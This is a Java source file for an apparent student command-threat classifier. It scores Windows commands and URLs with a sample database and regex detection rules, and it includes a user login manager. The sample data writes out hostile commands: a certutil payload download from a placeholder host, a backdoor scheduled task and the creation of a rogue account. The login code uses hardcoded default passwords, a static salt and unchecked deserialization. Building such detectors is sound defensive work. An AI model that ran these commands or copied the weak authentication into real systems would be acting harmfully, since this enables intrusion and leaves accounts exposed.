/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package malcommandguard;
import org.apache.poi.ss.usermodel.*;
import org.apache.poi.xssf.usermodel.XSSFWorkbook;
import java.io.*;
import java.util.*;
import java.util.regex.Pattern;
import static org.apache.poi.ss.usermodel.CellType.BOOLEAN;
import static org.apache.poi.ss.usermodel.CellType.FORMULA;
import static org.apache.poi.ss.usermodel.CellType.NUMERIC;
import static org.apache.poi.ss.usermodel.CellType.STRING;

/**
 *
 * @author User
 */
public class CommandAnalyzer {
private Map<String, DetailedCommandEntry> commandDatabase;
    private List<DetectionRule> rules;
    private static final String DATABASE_FILE = "cmd_huge_known_commented_updated.xlsx";
    
    public int getDetectionRulesCount(){
        return rules.size();
    }
    public CommandAnalyzer() {
        commandDatabase = new HashMap<>();
        rules = new ArrayList<>();
        loadDatabase();
        createDetectionRules();
        System.out.println("[SUCCESS] Enhanced command analyzer initialized");
    }
    
    private void loadDatabase() {
        try {
            File dbFile = new File(DATABASE_FILE);
            if (!dbFile.exists()) {
                System.out.println("[WARNING] Database file not found. Creating sample database...");
                createSampleDatabase();
                return;
            }
            
            System.out.println("[INFO] Loading database from Excel file...");
            FileInputStream fis = new FileInputStream(dbFile);
            Workbook workbook = new XSSFWorkbook(fis);
            Sheet sheet = workbook.getSheetAt(0);
            
            int loaded = 0;
            boolean isFirstRow = true;
            
            for (Row row : sheet) {
                if (isFirstRow) {
                    isFirstRow = false;
                    continue; // Skip header
                }
                
                try {
                    // Read all columns as per your Excel structure
                    String prompt = getCellValue(row.getCell(0));         // Column A
                    String response = getCellValue(row.getCell(1));       // Column B  
                    String lolbin = getCellValue(row.getCell(2));         // Column C - Lolbin (0.05)
                    String content = getCellValue(row.getCell(3));        // Column D - Content (0.4)
                    String frequency = getCellValue(row.getCell(4));      // Column E - Frequency (0.2)
                    String source = getCellValue(row.getCell(5));         // Column F - Source (0.1)
                    String network = getCellValue(row.getCell(6));        // Column G - Network (0.1)
                    String behavioural = getCellValue(row.getCell(7));    // Column H - Behavioural (0.1)
                    String history = getCellValue(row.getCell(8));        // Column I - History (0.05)
                    double score = getCellNumber(row.getCell(9));         // Column J - Score
                    String label = getCellValue(row.getCell(10));         // Column K - Label
                    
                    if (!prompt.isEmpty() && !label.isEmpty()) {
                        DetailedCommandEntry entry = new DetailedCommandEntry(
                            prompt, response, lolbin, content, frequency, 
                            source, network, behavioural, history, score, label
                        );
                        commandDatabase.put(prompt.toLowerCase().trim(), entry);
                        loaded++;
                    }
                } catch (Exception e) {
                    // Skip malformed rows
                    System.out.println("[WARNING] Skipping malformed row: " + e.getMessage());
                }
            }
            
            workbook.close();
            fis.close();
            System.out.println("[SUCCESS] Database loaded: " + loaded + " detailed command entries");
            
        } catch (Exception e) {    
            System.out.println("[ERROR] Error loading database: " + e.getMessage());
            createSampleDatabase();
        }
    }
    
    private String getCellValue(Cell cell) {
        if (cell == null) return "";
        try {
            switch (cell.getCellType()) {
                case STRING: 
                    return cell.getStringCellValue().trim();
                case NUMERIC: 
                    return String.valueOf((long)cell.getNumericCellValue());
                case BOOLEAN:
                    return String.valueOf(cell.getBooleanCellValue());
                case FORMULA:
                    try {
                        return cell.getStringCellValue().trim();
                    } catch (IllegalStateException e) {
                        return String.valueOf(cell.getNumericCellValue());
                    }
                default: 
                    return "";
            }
        } catch (Exception e) {
            return "";
        }
    }
    
    private double getCellNumber(Cell cell) {
        if (cell == null) return 0.0;
        try {
            switch (cell.getCellType()) {
                case NUMERIC: 
                    return cell.getNumericCellValue();
                case STRING: 
                    String value = cell.getStringCellValue().trim();
                    if (value.isEmpty()) return 0.0;
                    return Double.parseDouble(value);
                case FORMULA:
                    return cell.getNumericCellValue();
                default: 
                    return 0.0;
            }
        } catch (Exception e) {
            return 0.0;
        }
    }
    
    private void createSampleDatabase() {
        System.out.println("[INFO] Creating detailed sample database for testing...");
        
        // Malicious commands with detailed breakdown
        addDetailedSample("powershell -encodedcommand", 
                         "This command uses encoded PowerShell which is commonly used to obfuscate malicious code and evade detection systems.",
                         "powershell", "encodedcommand", "rare", "command line", "none", "execution", "none", 0.90, "malicious");
        
        addDetailedSample("certutil -urlcache -split -f http://malicious.com/payload.exe", 
                         "CertUtil being used to download files from remote locations, a common technique used by attackers.",
                         "certutil", "http://malicious.com/payload.exe", "uncommon", "remote URL", "malicious.com", "download", "known technique", 0.85, "malicious");
        
        addDetailedSample("schtasks /create /tn backdoor /tr malware.exe", 
                         "Creating scheduled tasks for persistence, allowing malware to run automatically at system startup.",
                         "schtasks", "backdoor, malware.exe", "rare", "system command", "none", "persistence", "known malware technique", 0.88, "malicious");
        
        addDetailedSample("wmic process call create cmd.exe", 
                         "Using WMIC to create processes remotely, often used for lateral movement and command execution.",
                         "wmic", "process call create", "uncommon", "system command", "none", "process creation", "attack technique", 0.82, "malicious");
        
        addDetailedSample("net user hacker Password123 /add", 
                         "Creating new user accounts, potentially for maintaining persistent access to the system.",
                         "net", "user creation", "rare", "system command", "none", "account creation", "persistence technique", 0.80, "malicious");
        
        // Suspicious commands
        addDetailedSample("net user administrator", 
                         "Enumerating administrator account information, could indicate reconnaissance activities.",
                         "none", "administrator", "uncommon", "system command", "none", "enumeration", "recon technique", 0.60, "suspicious");
        
        addDetailedSample("whoami /priv", 
                         "Checking current user privileges, often used in post-exploitation reconnaissance.",
                         "none", "privilege check", "uncommon", "system command", "none", "enumeration", "recon activity", 0.55, "suspicious");
        
        addDetailedSample("reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                         "Querying registry for startup programs, could indicate system reconnaissance or malware analysis.",
                         "none", "registry query", "uncommon", "registry", "none", "enumeration", "system analysis", 0.50, "suspicious");
        
        addDetailedSample("netstat -an", 
                         "Displaying network connections, could be used for network reconnaissance or monitoring.",
                         "none", "network connections", "common", "network command", "none", "enumeration", "network analysis", 0.45, "suspicious");
        
        // Legitimate commands
        addDetailedSample("dir", 
                         "Standard directory listing command for normal file system navigation and management.",
                         "none", "directory listing", "very common", "file command", "none", "navigation", "normal usage", 0.05, "legitimate");
        
        addDetailedSample("ipconfig /all", 
                         "Network configuration display command for legitimate network troubleshooting and administration.",
                         "none", "network config", "common", "network command", "none", "information", "admin task", 0.10, "legitimate");
        
        addDetailedSample("ping google.com", 
                         "Network connectivity test to verify internet connection, standard network diagnostic tool.",
                         "none", "google.com", "very common", "network command", "google.com", "connectivity test", "normal usage", 0.08, "legitimate");
        
        addDetailedSample("systeminfo", 
                         "System information display for legitimate system administration and troubleshooting purposes.",
                         "none", "system information", "common", "system command", "none", "information", "admin task", 0.12, "legitimate");
        
        System.out.println("[SUCCESS] Detailed sample database created: " + commandDatabase.size() + " entries");
    }
    
    private void addDetailedSample(String prompt, String response, String lolbin, String content, 
                                 String frequency, String source, String network, String behavioural, 
                                 String history, double score, String label) {
        DetailedCommandEntry entry = new DetailedCommandEntry(
            prompt, response, lolbin, content, frequency, source, network, behavioural, history, score, label
        );
        commandDatabase.put(prompt.toLowerCase(), entry);
    }
    
    private void createDetectionRules() {
        rules.clear();
        
        // Enhanced malicious patterns
        addRule(".*powershell.*-enc.*", "malicious", 0.90, "Encoded PowerShell execution detected");
        addRule(".*powershell.*iex.*", "malicious", 0.85, "PowerShell Invoke-Expression usage");
        addRule(".*powershell.*bypass.*", "malicious", 0.80, "PowerShell execution policy bypass");
        addRule(".*certutil.*-urlcache.*", "malicious", 0.90, "CertUtil file download technique");
        addRule(".*bitsadmin.*/transfer.*", "malicious", 0.85, "BITS Admin file transfer");
        addRule(".*schtasks.*/create.*", "malicious", 0.88, "Scheduled task creation for persistence");
        addRule(".*wmic.*process.*create.*", "malicious", 0.82, "WMIC process execution");
        addRule(".*net.*user.*\\/add.*", "malicious", 0.80, "User account creation");
        addRule(".*rundll32.*javascript.*", "malicious", 0.85, "Rundll32 JavaScript execution");
        addRule(".*regsvr32.*/u.*/s.*", "malicious", 0.75, "Regsvr32 suspicious usage");
        addRule(".*cmd.*\\/c.*echo.*\\|.*", "malicious", 0.70, "Command chaining with pipes");
  
        // Enhanced suspicious patterns
        addRule(".*net.*user(?!.*\\/add).*", "suspicious", 0.60, "User account enumeration");
        addRule(".*reg.*query.*", "suspicious", 0.50, "Registry querying activity");
        addRule(".*whoami.*/priv.*", "suspicious", 0.55, "Privilege enumeration");
        addRule(".*tasklist.*/svc.*", "suspicious", 0.52, "Service enumeration");
        addRule(".*netstat.*-a.*", "suspicious", 0.45, "Network connection enumeration");
        addRule(".*sc.*query.*", "suspicious", 0.50, "Service control querying");
        addRule(".*query.*user.*", "suspicious", 0.48, "User session querying");
        addRule(".*dir.*\\/s.*", "suspicious", 0.40, "Recursive directory listing");
        addRule(".*findstr.*/s.*/i.*password.*", "suspicious", 0.65, "Password file searching");
        
        
        // Legitimate patterns
        addRule("^(dir|ls|pwd|cd|cls|clear)$", "legitimate", 0.05, "Basic file system commands");
        addRule("^(ping|ipconfig|nslookup|tracert)\\s+[a-zA-Z0-9.-]+$", "legitimate", 0.10, "Network diagnostic tools");
        addRule("^systeminfo$", "legitimate", 0.08, "System information command");
        addRule("^(copy|move|del|mkdir|rmdir)\\s+.*", "legitimate", 0.12, "File management operations");
        
         // Additional suspicious patterns
        addRule(".*\\$env:.*", "suspicious", 0.5, "PowerShell environment variable usage");
        addRule(".*invoke-webrequest.*", "suspicious", 0.6, "PowerShell web request");
        addRule(".*curl.*-o.*\\.(exe|bat|ps1).*", "suspicious", 0.7, "Downloading executable with curl");
        addRule(".*wget.*\\.(exe|bat|ps1).*", "suspicious", 0.7, "Downloading executable with wget");
        
     //LEGITIMATE URL PATTERNS
     // ==================================================
    
    // Major trusted domains
    addRule("^https://(www\\.)?(google|microsoft|github|stackoverflow|amazon|oracle|adobe|apple)\\.com.*", "legitimate", 0.05, "Trusted major website");
    addRule("^https://(docs\\.)?(microsoft|oracle|mozilla|developer\\.mozilla)\\.org.*", "legitimate", 0.05, "Official documentation");
    addRule("^https://[a-zA-Z0-9.-]+\\.(edu|gov|mil)(/.*)?$", "legitimate", 0.05, "Educational/Government website");
    addRule("^https://[a-zA-Z0-9.-]+\\.(com|org|net)(/[a-zA-Z0-9._/-]*)?$", "legitimate", 0.10, "Standard HTTPS website");
    
    // SUSPICIOUS URL PATTERNS
    // ==================================================
    
    // Private IP addresses
    addRule(".*https?://192\\.168\\..*", "suspicious", 0.40, "Private IP address (192.168.x.x)");
    addRule(".*https?://10\\..*", "suspicious", 0.40, "Private IP address (10.x.x.x)");
    addRule(".*https?://172\\.(1[6-9]|2[0-9]|3[01])\\..*", "suspicious", 0.40, "Private IP address (172.16-31.x.x)");
    addRule(".*https?://127\\.0\\.0\\.1.*", "suspicious", 0.35, "Localhost IP address");
    addRule(".*https?://localhost.*", "suspicious", 0.35, "Localhost domain");
    
    // Non-standard ports
    addRule(".*https?://.*:(8080|8443|9090|3389|4444|5555|6666|7777|8888|9999).*", "suspicious", 0.50, "Non-standard port");
    
    // Suspicious file extensions
    addRule(".*https?://.*\\.(zip|rar|7z|tar\\.gz).*", "suspicious", 0.45, "Archive file download");
    addRule(".*https?://.*\\.(php|asp|jsp).*", "suspicious", 0.40, "Dynamic web page");
    
    // Admin/login pages
    addRule(".*https?://.*/(admin|login|config|dashboard).*", "suspicious", 0.50, "Administrative interface");
    
    // URL shorteners
    addRule(".*https?://(bit\\.ly|tinyurl\\.com|t\\.co|goo\\.gl|short\\.link).*", "suspicious", 0.55, "URL shortener");
    
    // Suspicious TLDs
    addRule(".*https?://.*\\.(tk|ml|ga|cf).*", "suspicious", 0.60, "Suspicious top-level domain");
    
    // Raw content sites
    addRule(".*pastebin\\.com/raw/.*", "suspicious", 0.60, "Pastebin raw content");
    addRule(".*raw\\.githubusercontent\\.com.*", "suspicious", 0.45, "GitHub raw content");
    
    // Base64 or encoded content
    addRule(".*https?://.*base64.*", "suspicious", 0.50, "Base64 encoded content");
    addRule(".*https?://.*%[0-9a-fA-F]{2}.*", "suspicious", 0.40, "URL encoded characters");
    
    // MALICIOUS URL PATTERNS
    // ==================================================
    
    // Known malicious test domains
    addRule(".*malware\\.testing\\.google\\.test.*", "malicious", 0.95, "Google malware testing domain");
    addRule(".*testsafebrowsing\\.appspot\\.com.*", "malicious", 0.90, "Google safe browsing test");
    addRule(".*eicar\\.org.*", "malicious", 0.85, "EICAR test file domain");
    addRule(".*malware\\.wicar\\.org.*", "malicious", 0.95, "WICAR malware test domain");
    addRule(".*027\\.ru.*", "malicious", 0.90, "Known malicious domain");
    
    // IP addresses with executables
    addRule(".*https?://(?:\\d{1,3}\\.){3}\\d{1,3}.*\\.(exe|bat|cmd|scr|com|pif).*", "malicious", 0.95, "IP address with executable file");
    
    // Direct executable downloads
    addRule(".*https?://.*\\.(exe|bat|cmd|scr|com|pif|msi)$", "malicious", 0.90, "Direct executable download");
    
    // Command injection in URLs
    addRule(".*https?://.*[\\?&](cmd|exec|run|command|shell)=.*", "malicious", 0.90, "URL command injection");
    
    // Malicious file patterns in URLs
    addRule(".*https?://.*/(payload|backdoor|shell|trojan|virus|malware).*", "malicious", 0.95, "URL with malicious file names");
    
        System.out.println("[SUCCESS] Enhanced detection rules loaded: " + rules.size() + " patterns");
    }
    
    private void addRule(String pattern, String classification, double score, String description) {
        try {
            rules.add(new DetectionRule(pattern, classification, score, description));
        } catch (Exception e) {
            System.out.println("[WARNING] Invalid regex pattern: " + pattern);
        }
    }
    
    public DetailedAnalysisResult analyzeCommandDetailed(String command) {
        if (command == null || command.trim().isEmpty()) {
            return new DetailedAnalysisResult("legitimate", 0.0, "Empty command", 
                                            "none", "none", "none", "none", "none", "none", "none");
        }
        
        // Input sanitization
        command = sanitizeInput(command);
        String normalized = command.toLowerCase().trim();
        
        // 1. Check exact database match
        DetailedCommandEntry exact = commandDatabase.get(normalized);
        if (exact != null) {
            return new DetailedAnalysisResult(exact.getLabel(), exact.getScore(), exact.getResponse(),
                                            exact.getLolbin(), exact.getContent(), exact.getFrequency(),
                                            exact.getSource(), exact.getNetwork(), exact.getBehavioural(), exact.getHistory());
        }
        
        // 2. Check partial database matches
        for (Map.Entry<String, DetailedCommandEntry> entry : commandDatabase.entrySet()) {
            String dbCommand = entry.getKey();
            if (normalized.contains(dbCommand) || dbCommand.contains(normalized)) {
                DetailedCommandEntry match = entry.getValue();
                return new DetailedAnalysisResult(match.getLabel(), match.getScore(), 
                                                "Partial match: " + match.getResponse(),
                                                match.getLolbin(), match.getContent(), match.getFrequency(),
                                                match.getSource(), match.getNetwork(), match.getBehavioural(), match.getHistory());
            }
        }
        
        // 3. Apply enhanced detection rules
        for (DetectionRule rule : rules) {
            if (rule.matches(normalized)) {
                return new DetailedAnalysisResult(rule.getClassification(), rule.getScore(), rule.getDescription(),
                                                "rule-based", "pattern match", "analysis", "command", "detected", "behavioral", "none");
            }
        }
        
        // 4. Default classification with basic analysis
        return new DetailedAnalysisResult("legitimate", 0.1, "No specific threats detected - classified as legitimate",
                                        "none", "unknown command", "uncommon", "user input", "none", "new command", "none");
    }
    
    private String sanitizeInput(String input) {
        if (input == null) return "";
        // Remove control characters but preserve command structure for analysis
        return input.replaceAll("[\\r\\n\\t]", " ").trim();
    }
    
//    public void reloadDatabase() {
//        System.out.println("[INFO] Reloading database and detection rules...");
//        commandDatabase.clear();
//        rules.clear();
//        loadDatabase();
//        createDetectionRules();
//        System.out.println("[SUCCESS] Database and rules reloaded successfully");
//    }
    
    public int getDatabaseSize() {
        return commandDatabase.size();
    }
    
    public Map<String, Integer> getClassificationStats() {
        Map<String, Integer> stats = new HashMap<>();
        stats.put("malicious", 0);
        stats.put("suspicious", 0);  
        stats.put("legitimate", 0);
        
        for (DetailedCommandEntry entry : commandDatabase.values()) {
            String rawClassification = entry.getLabel().toLowerCase();
            String normalizedClassification = normalizeClassificationForStats(rawClassification);
            stats.put(normalizedClassification, stats.getOrDefault(normalizedClassification, 0) + 1);
        }
        
        return stats;
    }
    
    /**
     * Normalizes classification labels for statistics display
     * Maps database variants to standard terminology
     */
    private String normalizeClassificationForStats(String classification) {
        if (classification == null) return "legitimate";
        
        String normalized = classification.toLowerCase().trim();
        
        // Map database variants to standard display terms
        switch (normalized) {
            case "benign":
            case "legitimate":
            case "safe":
            case "clean":
                return "legitimate";
                
            case "malicious":
            case "malware":
            case "dangerous":
            case "harmful":
                return "malicious";
                
            case "suspicious":
            case "suspect":
            case "questionable":
            case "warning":
                return "suspicious";
                
            default:
                // For any unknown classification, default to legitimate
                return "legitimate";
        }
    }
    
    public void displayDatabaseInfo() {
        System.out.println("\nDETAILED DATABASE INFORMATION");
        System.out.println("=".repeat(40));
        System.out.println("Total entries: " + commandDatabase.size());
        
        Map<String, Integer> stats = getClassificationStats();
        System.out.println("Classification breakdown:");
        System.out.println("  Malicious: " + stats.getOrDefault("malicious", 0));
        System.out.println("  Suspicious: " + stats.getOrDefault("suspicious", 0));
        System.out.println("  Legitimate: " + stats.getOrDefault("legitimate", 0));
        
        System.out.println("\nDetection rules loaded: " + rules.size());
        System.out.println("Database file: " + DATABASE_FILE);
       
    }
}



// Enhanced data classes for detailed analysis
class DetailedCommandEntry {
    private String prompt;
    private String response;
    private String lolbin;
    private String content;
    private String frequency;
    private String source;
    private String network;
    private String behavioural;
    private String history;
    private double score;
    private String label;
    
    public DetailedCommandEntry(String prompt, String response, String lolbin, String content, 
                              String frequency, String source, String network, String behavioural, 
                              String history, double score, String label) {
        this.prompt = prompt;
        this.response = response;
        this.lolbin = lolbin;
        this.content = content;
        this.frequency = frequency;
        this.source = source;
        this.network = network;
        this.behavioural = behavioural;
        this.history = history;
        this.score = score;
        this.label = label;
    }
    
    // Getters
    public String getPrompt() { return prompt; }
    public String getResponse() { return response; }
    public String getLolbin() { return lolbin; }
    public String getContent() { return content; }
    public String getFrequency() { return frequency; }
    public String getSource() { return source; }
    public String getNetwork() { return network; }
    public String getBehavioural() { return behavioural; }
    public String getHistory() { return history; }
    public double getScore() { return score; }
    public String getLabel() { return label; }
}

class DetectionRule {
    private Pattern pattern;
    private String classification;
    private double score;
    private String description;
    
    public DetectionRule(String regex, String classification, double score, String description) {
        this.pattern = Pattern.compile(regex, Pattern.CASE_INSENSITIVE);
        this.classification = classification;
        this.score = score;
        this.description = description;
    }
    
    public boolean matches(String input) {
        return pattern.matcher(input).find();
    }
    
    public String getClassification() { return classification; }
    public double getScore() { return score; }
    public String getDescription() { return description; }
}

class DetailedAnalysisResult {
    private String label;
    private double score;
    private String response;
    private String lolbin;
    private String content;
    private String frequency;
    private String source;
    private String network;
    private String behavioural;
    private String history;
    
    public DetailedAnalysisResult(String label, double score, String response, String lolbin, 
                                String content, String frequency, String source, String network, 
                                String behavioural, String history) {
        this.label = label;
        this.score = score;
        this.response = response;
        this.lolbin = lolbin;
        this.content = content;
        this.frequency = frequency;
        this.source = source;
        this.network = network;
        this.behavioural = behavioural;
        this.history = history;
    }
    
    // Getters
    public String getLabel() { return label; }
    public double getScore() { return score; }
    public String getResponse() { return response; }
    public String getLolbin() { return lolbin; }
    public String getContent() { return content; }
    public String getFrequency() { return frequency; }
    public String getSource() { return source; }
    public String getNetwork() { return network; }
    public String getBehavioural() { return behavioural; }
    public String getHistory() { return history; }
}

// Note: User class is defined in separate User.java file

class UserManager {
    private Map<String, User> users;
    private static final String USERS_FILE = "users.dat";
    private static final String SALT = "MalCommandGuard2025_SecureSalt"; // Salt for password hashing
    
    public UserManager() {
        users = new HashMap<>();
        loadUsers();
        
        // Create default admin if no users exist
        if (users.isEmpty()) {
            users.put("admin", new User("admin", hashPasswordWithSalt("admin123"), "ADMIN"));
            users.put("user", new User("user", hashPasswordWithSalt("user123"), "USER"));
            saveUsers();
            System.out.println("[INFO] Default users created with hashed passwords");
            System.out.println("[SECURITY] All passwords are SHA-256 hashed with salt");
        }
    }
    
    public User authenticate(String username, String password) {
        if (username == null || password == null) return null;
        
        // Input sanitization
        username = username.replaceAll("[<>\"'&;\\\\]", "").trim();
        
        User user = users.get(username.toLowerCase());
        if (user != null && verifyPassword(password, user.getHashedPassword())) {
            System.out.println("[SECURITY] Password verification successful using SHA-256 hash");
            return user;
        }
        return null;
    }
    
    public boolean registerUser(String username, String password, String role) {
        if (username == null || password == null || role == null) return false;
        if (users.containsKey(username.toLowerCase())) return false;
        
        String hashedPassword = hashPasswordWithSalt(password);
        User newUser = new User(username, hashedPassword, role.toUpperCase());
        users.put(username.toLowerCase(), newUser);
        
        System.out.println("[SECURITY] New user password hashed with SHA-256 + salt");
        return saveUsers();
    }
    
    public boolean userExists(String username) {
        return users.containsKey(username.toLowerCase());
    }
    
    public void displayAllUsers() {
        System.out.println("\nREGISTERED USERS");
        System.out.println("=".repeat(30));
        System.out.printf("%-15s %-10s %-20s%n", "Username", "Role", "Created Date");
        System.out.println("-".repeat(45));
        
        for (User user : users.values()) {
            System.out.printf("%-15s %-10s %-20s%n", 
                            user.getUsername(), 
                            user.getRole(), 
                            user.getCreatedDate().toString().substring(0, 19));
        }
        System.out.println("\n[SECURITY] All passwords are SHA-256 hashed and cannot be recovered");
    }
    
    /**
     * Enhanced password hashing with salt using SHA-256
     * Salt prevents rainbow table attacks
     */
    private String hashPasswordWithSalt(String password) {
        try {
            // Combine password with salt
            String saltedPassword = password + SALT;
            
            java.security.MessageDigest md = java.security.MessageDigest.getInstance("SHA-256");
            byte[] hash = md.digest(saltedPassword.getBytes("UTF-8"));
            
            // Convert to hexadecimal string
            StringBuilder hexString = new StringBuilder();
            for (byte b : hash) {
                String hex = Integer.toHexString(0xff & b);
                if (hex.length() == 1) hexString.append('0');
                hexString.append(hex);
            }
            
            String hashedResult = hexString.toString();
            System.out.println("[SECURITY] Password hashed: " + hashedResult.substring(0, 16) + "...[truncated for security]");
            
            return hashedResult;
        } catch (Exception e) {
            throw new RuntimeException("Error hashing password with salt", e);
        }
    }
    
    private boolean verifyPassword(String password, String hashedPassword) {
        String hashedInput = hashPasswordWithSalt(password);
        boolean isValid = hashedInput.equals(hashedPassword);
        
        if (isValid) {
            System.out.println("[SECURITY] Password hash verification: SUCCESS");
        } else {
            System.out.println("[SECURITY] Password hash verification: FAILED");
        }
        
        return isValid;
    }
    
    private void loadUsers() {
        try {
            File file = new File(USERS_FILE);
            if (!file.exists()) {
                System.out.println("[INFO] No existing user database found. Will create new one.");
                return;
            }
            
            ObjectInputStream ois = new ObjectInputStream(new FileInputStream(file));
            users = (Map<String, User>) ois.readObject();
            ois.close();
            System.out.println("[SECURITY] User database loaded with hashed passwords");
        } catch (Exception e) {
            System.out.println("[WARNING] Could not load users file: " + e.getMessage());
            System.out.println("[INFO] Starting with empty user database");
        }
    }
    
    private boolean saveUsers() {
        try {
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(USERS_FILE));
            oos.writeObject(users);
            oos.close();
            System.out.println("[SECURITY] User database saved with hashed passwords");
            return true;
        } catch (Exception e) {
            System.out.println("[ERROR] Could not save users: " + e.getMessage());
            return false;
        }
    }




}